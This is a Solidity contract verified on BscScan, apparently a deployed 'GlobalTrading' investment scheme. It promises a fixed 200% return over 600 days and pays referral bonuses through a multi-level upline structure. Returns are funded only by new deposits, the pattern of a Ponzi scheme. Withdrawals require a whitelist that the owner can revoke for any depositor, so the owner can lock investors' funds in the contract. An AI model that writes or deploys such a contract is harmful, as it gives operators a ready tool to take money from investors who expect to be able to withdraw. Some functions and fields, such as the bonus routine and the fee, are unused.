/**
 *Submitted for verification at BscScan.com on 2021-10-22
*/

pragma solidity 0.4.25;
contract GlobalTrading {
    using SafeMath for uint256;
    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 min_inv;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 checkpoint;
        uint256 dividends;
        uint256 last_payout;
        uint256 gi_bonus;
        uint256 available;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) level_business;
    }

    address public owner;
    uint256[] public GI_PERCENT = [200,100,100,60,60];
    uint256 public invested;
    uint256 public gi_bonus;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public withdrawFee;
  
    uint256 public releaseTime = 1598104800;//1598104800
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;
     mapping(address => bool) public whiteListed;
    

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayoutgi(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event MatchPayoutStat(address upline,uint256 total_directs, uint256 level_b);

    constructor() public {
        owner = msg.sender;
       
         withdrawFee = 0;
        whiteListed[owner] = true;

        //days , total return percentage//min invest
        tarifs.push(Tarif(600, 200,25 * 10 ** 16));  //5% monthy tenure->20 months
        
        ref_bonuses.push(20);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            up.transfer(bonus);
            emit MatchPayout(up, _addr, bonus);
         
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline,uint256 amount) private {
        if(players[_addr].upline == address(0)) {//first time entry
            if(players[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = owner;
            }
            players[_addr].upline = _upline;
            for(uint8 i = 0; i < GI_PERCENT.length; i++) {
                players[_upline].structure[i]++;
                 players[_upline].level_business[i] += amount;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
        
         else
             {
                _upline = players[_addr].upline;
            for( i = 0; i < GI_PERCENT.length; i++) {
                     players[_upline].level_business[i] += amount;
                    _upline = players[_upline].upline;
                    if(_upline == address(0)) break;
                }
        }
        
    }

   function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
        require(msg.value >= tarifs[_tarif].min_inv, "Less Then the min investment");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];

    
        _setUpline(msg.sender, _upline, msg.value); 
        
        if(player.deposits.length < 1)
        {
             player.checkpoint = block.timestamp;
              whiteListed[msg.sender] = true;
        }
        
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));


       
       
        
        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);


        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() payable external {
        require(whiteListed[msg.sender] == true);
         require(
            getTimer(msg.sender) < block.timestamp,
            "withdrawal is available only once every month"
        );

        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 , "Zero amount");

        uint256 amount = player.dividends  + player.gi_bonus;

         player.checkpoint = block.timestamp;
        player.dividends = 0;
         player.gi_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
     function getTimer(address userAddress) public view returns (uint256) {
        return players[userAddress].checkpoint.add(30 days);
    }

    function _send_gi(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            if(up == address(0)) break;

                uint256 bonus = _amount * GI_PERCENT[i] / 1000;
                players[up].gi_bonus += bonus;
                gi_bonus += bonus;
           
            up = players[up].upline;
            emit MatchPayoutgi(up, _addr, bonus);
        }
    }



    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
        return value;
    }
    
  
    /*
        Only external call
    */
   function userInfo(address _addr) view external returns(uint256[] memory structure,uint256[] memory structurebusiness) {
        Player storage player = players[_addr];
        
        uint256[] memory _structure = new uint256[](GI_PERCENT.length);
        uint256[] memory _structurebusiness = new uint256[](GI_PERCENT.length);
     


        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            _structure[i] = player.structure[i];
            _structurebusiness[i] =  player.level_business[i];
           
        }

        return (_structure,_structurebusiness);
    }
    

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,uint256 _match_bonus) {
        return (invested, withdrawn,match_bonus);
    }

  

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return values;
    }
    
    
    function setWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function removeWhitelist(address _addr) public {
        require(msg.sender == owner,"unauthorized call");
        whiteListed[_addr] = false;
    }

    function setWithdrawFee(uint256 newFee) public {
        require(msg.sender == owner,"unauthorized call");
        withdrawFee = newFee;
    }
    
    function getUserCheckpoint(address userAddress) public view returns (uint256)
    {
        return players[userAddress].checkpoint;
    }


    
}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}